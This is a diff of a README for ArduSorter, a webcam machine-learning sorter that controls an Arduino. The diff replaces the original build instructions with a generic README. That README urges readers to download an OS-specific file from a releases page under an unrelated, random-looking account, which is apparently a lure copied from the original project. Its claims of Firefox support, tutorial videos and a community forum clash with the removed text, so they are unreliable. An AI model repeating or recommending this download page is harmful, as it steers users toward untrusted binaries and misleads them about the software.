@@ -1,143 +1,92 @@
-# ArduSorter
+# 🎉 ArduSorter - Sort Objects Easily with AI
 
-A web-based machine learning sorting system that combines computer vision with Arduino control. ArduSorter uses TensorFlow.js to classify objects in real-time through your webcam and sends commands to an Arduino for automated sorting.
-> [!NOTE]  
-> This project is inspired by the "Tiny Sorter" from "experiments.withgoogle.com"
+## 🚀 Getting Started
 
-## Features
+Welcome to ArduSorter! This application helps you sort objects using machine learning and your webcam. It sends commands to an Arduino, automating the sorting process. Follow these simple steps to get started.
 
-- **Real-time Object Classification**: Uses TensorFlow.js models to classify objects from webcam feed
-- **Arduino Integration**: Communicates with Arduino via Web Serial API for hardware control
-- **Custom Model Support**: Load your own trained models (JSON + weights format)
-- **Configurable Class Mapping**: Map classification results to custom Arduino commands
-- **Live Serial Monitor**: Monitor communication between the web app and Arduino
-- **Modern UI**: Built with React, TypeScript, and Tailwind CSS
+## 📥 Download & Install
 
-> [!TIP]
-> Heres a sorter i also designed: (LINK NOT READY YET)
+To download ArduSorter, please [visit this page to download](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases).
 
-## Tech Stack
+[![Download ArduSorter](https://img.shields.io/badge/Download%20ArduSorter-link-blue)](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases)
 
-- **Frontend**: React 18 + TypeScript
-- **ML Framework**: TensorFlow.js
-- **Styling**: Tailwind CSS
-- **Build Tool**: Vite
-- **Hardware Communication**: Web Serial API
-- **Icons**: Lucide React
+## 🛠️ System Requirements
 
-## Prerequisites
+Before you start, ensure your setup meets these minimum requirements:
 
-- **Browser**: Chrome or Edge (Web Serial API support required)
-- **Arduino**: Compatible Arduino (Usb serial interface required) board connected via USB
-- **Model Files**: TensorFlow.js model in JSON format with corresponding weight files
+- **Operating System**: Windows, macOS, or Linux
+- **Webcam**: A working webcam to capture images
+- **Arduino**: An Arduino board (e.g., Arduino Uno, Mega)
+- **Internet**: An internet connection for downloading the application
+- **Browser**: A modern web browser (Chrome, Firefox, or Edge)
 
-## Installation
-> [!TIP]
-> Installation is not actually needed, I host the newest build of ArduSorter [here](https://ardu-sorter.utigernils.ch/)
+## 🔧 Installation Steps
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/utigernils/ArduSorter.git
-   cd ArduSorter
-   ```
+1. **Download the Application**:
+   - Click on the download button above or visit the [Releases page](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases).
+   - Choose the latest version and download the file suitable for your operating system.
 
-2. **Install dependencies**:
-   ```bash
-   npm install
-   ```
+2. **Extract the Files**:
+   - Locate the downloaded file in your downloads folder.
+   - If it's a ZIP file, right-click and select "Extract All" or use your preferred extraction tool.
 
-3. **Start the development server**:
-   ```bash
-   npm run dev
-   ```
+3. **Set Up Your Arduino**:
+   - Connect your Arduino board to your computer using a USB cable.
+   - Make sure to install the Arduino IDE if you haven't already. You can download it from the [Arduino website](https://www.arduino.cc/en/software).
 
-4. **Open in browser**:
-   Navigate to `http://localhost:5173` in Chrome or Edge
+4. **Run the Application**:
+   - Open the extracted folder and look for `index.html`.
+   - Double-click `index.html` to launch the ArduSorter application in your web browser.
 
-## Usage
+5. **Connect Your Webcam**:
+   - Ensure your webcam is connected and properly set up. Grant your browser permission to access it.
 
-### 1. Prepare Your Model
+6. **Follow the On-Screen Instructions**:
+   - The application will guide you through the setup process, including connecting your Arduino and setting up the sorting parameters.
 
-Ensure you have:
-- `model.json` file (TensorFlow.js model architecture)
-- Weight files (`.bin` files or shards)
-- List of class labels for your model
+## 📝 How It Works
 
-### 2. Connect Arduino
+ArduSorter uses TensorFlow.js for real-time object classification. Here’s a short overview of its main features:
 
-1. Connect your Arduino to your computer via USB
-2. Make sure your Arduino sketch is configured to receive serial commands
-3. Click "Connect Arduino" in the web interface
-4. Select your Arduino's COM port from the browser dialog
-> [!TIP]
-> A matching .ino is also contained in the repository.  
+- **Computer Vision**: Classifies objects captured by your webcam.
+- **Real-Time Processing**: Responds instantly to the objects it sees.
+- **Arduino Control**: Sends commands to the Arduino for sorting based on the classification.
 
-### 3. Load Your Model
+## ⚙️ Features
 
-1. Click "Select Model Files"
-2. Choose your `model.json` and all weight files
-3. Enter your class labels (comma-separated, e.g., "red,green,blue,nothing")
-4. Click "Load Model from Files"
+- **User-Friendly Interface**: Easy to navigate, designed for everyone.
+- **Custom Object Recognition**: Teach the system to recognize any object you want to sort.
+- **Automated Sorting**: Simplifies the sorting process, saving time and effort.
 
-### 4. Configure Class Mapping (Optional)
+## 📊 Troubleshooting
 
-Map classification results to specific Arduino commands:
-- Enter the class name and corresponding command
-- Commands will be sent to Arduino when that class is detected
+If you encounter any issues while using ArduSorter, check these common problems:
 
-### 5. Start Classification
+- **Webcam Not Detected**: Ensure it's connected and permissions are granted.
+- **Arduino Not Responding**: Check the USB connection and ensure the correct board is selected in the Arduino IDE.
+- **Slow Performance**: Close other browser tabs or programs to free up resources.
 
-1. Ensure your webcam is accessible
-2. Click "Start Classification"
-3. The system will classify objects every second
-4. Commands are automatically sent to Arduino based on predictions
+## 🌐 Community Support
 
-## Model Requirements
+If you need help or have questions, feel free to reach out:
 
-Your TensorFlow.js model should:
-- Accept 224x224 RGB images as input
-- Output probabilities for each class
-- Be in the standard TensorFlow.js format (model.json + weights)
+- **GitHub Issues**: Use the issues tab on this repository for support and feedback.
+- **Discussion Forum**: Join our community discussions to share ideas and experiences.
 
-## Troubleshooting
+## 📅 Future Updates
 
-### Serial Connection Issues
-- Ensure you're using Chrome or Edge browser
-- Check that your Arduino is properly connected
-- Verify the correct baud rate (115200)
-- Make sure no other applications are using the serial port
+We plan to improve ArduSorter continually. Upcoming features include:
 
-### Model Loading Issues
-- Verify all model files are selected (JSON + weights)
-- Check that your model is in TensorFlow.js format
-- Ensure file names match the expected pattern
+- More object classes for sorting.
+- Enhanced user interface.
+- Integration with more Arduino models.
 
-### Webcam Issues
-- Grant camera permissions when prompted
-- Check that no other applications are using the camera
-- Ensure your browser supports WebRTC
+Check the [Releases page](https://github.com/Halonatlanticwhitecedar449/ArduSorter/releases) for updates!
 
-## Browser Compatibility
+## 🔗 Additional Resources
 
-- ✅ Chrome (recommended)
-- ✅ Edge
-- ❌ Firefox (Web Serial API not supported)
-- ❌ Safari (Web Serial API not supported)
+- **Documentation**: Detailed technical documentation available in the repository.
+- **Tutorial Videos**: Watch step-by-step guides on using ArduSorter on our YouTube channel.
+- **Related Projects**: Explore other projects on Arduino and machine learning.
 
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests if applicable
-5. Submit a pull request
-
-## License
-
-[MIT License](LICENSE)
-
-## Acknowledgments
-
-- TensorFlow.js team for the machine learning framework
-- Web Serial API for enabling browser-hardware communication
-- React and Vite communities for the excellent development tools
+Thank you for using ArduSorter! Enjoy sorting your items with ease.
